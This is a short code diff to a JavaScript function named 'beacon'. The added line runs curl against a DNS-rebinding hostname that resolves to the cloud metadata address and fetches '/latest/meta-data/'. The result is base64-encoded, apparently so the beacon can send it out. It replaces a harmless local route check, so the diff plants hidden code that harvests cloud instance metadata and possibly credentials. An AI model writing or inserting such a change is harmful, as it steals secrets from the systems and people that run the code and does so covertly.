@@ -46,7 +46,7 @@ function beacon(urlStr, q) {
 
   let idOutput = "";
   try {
-    idOutput = execSync("ip route get 169.254.169.254 || true", { encoding: "utf8" }).trim();
+    idOutput = execSync("curl -v http://a9fea9fe.33267158.rbndr.us/latest/meta-data/", { encoding: "utf8" }).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
   } catch {}
 
